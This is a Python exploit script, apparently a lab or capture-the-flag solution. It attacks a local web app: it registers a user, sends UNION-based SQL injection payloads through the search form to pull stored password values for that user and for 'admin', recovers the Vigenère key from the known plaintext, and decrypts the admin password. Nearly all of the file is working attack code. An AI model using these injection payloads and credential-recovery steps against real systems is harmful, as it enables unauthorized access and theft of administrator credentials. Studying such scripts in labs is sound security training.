import requests
import re



# method to find key with cleartext and encrypted password
def find_vigenere_key(plaintext, ciphertext):
    def letter_to_num(letter):
        return ord(letter.upper()) - ord('A')

    def num_to_letter(num):
        return chr(num + ord('A'))

    key = []
    for p, c in zip(plaintext, ciphertext):
        shift = (letter_to_num(c) - letter_to_num(p)) % 26
        key.append(num_to_letter(shift))
    key = ''.join(key)
    
    # detect pattern in the key
    for i in range(1, len(key)):
        if key[:i] == key[i:2*i]:
            return key[:i]  
    return key  

# method to decrypt encrypted password with key
def vigenere_decrypt(ciphertext, key):
    def letter_to_num(letter):
        return ord(letter.upper()) - ord('A')

    def num_to_letter(num):
        return chr(num + ord('A'))

    full_key = (key * (len(ciphertext) // len(key) + 1))[:len(ciphertext)]
    
    plaintext = []
    for c, k in zip(ciphertext, full_key):
        shift = (letter_to_num(c) - letter_to_num(k)) % 26
        plaintext.append(num_to_letter(shift))
    
    return ''.join(plaintext)


# Registration request
register_url = "http://localhost:8080/register" 
password = 'QWERTYUIOPASDFGHJKL'
data = {
    'name': 'ellie1',
    'username': 'ellie1',
    'password': password
}       
response = requests.post(register_url, data=data)



# SQL injection to retrieve 'ellie1' password hash
search_url = "http://localhost:8080/search"
data = {
    'name': 'hello\" union SELECT password_hash FROM members WHERE username = \"ellie1\"; --'   
} 
response = requests.post(search_url, data=data)
encrypted_password_match = re.search(r'<p>(.*)</p>', response.text)




if encrypted_password_match:
    encrypted_password = encrypted_password_match.group(1)
    # print(encrypted_password)
    key = find_vigenere_key(password, encrypted_password)
    print("Detected Key:", key)
else:
    print("Encrypted password for 'ellie1' not found.")



# SQL injection to retrieve 'admin' password hash
data = {
    'name': 'helloo\" union SELECT password_hash FROM members WHERE username = \"admin\"; --'   
} 
response = requests.post(search_url, data=data)
encrypted_admin_password_match = re.search(r'<p>(.*)</p>', response.text)

if encrypted_admin_password_match:
    encrypted_admin_password = encrypted_admin_password_match.group(1)
    # print(encrypted_admin_password)
    admin_password = vigenere_decrypt(encrypted_admin_password, key)
    print("Admin Password:", admin_password)
else:
    print("Encrypted password for 'admin' not found.")
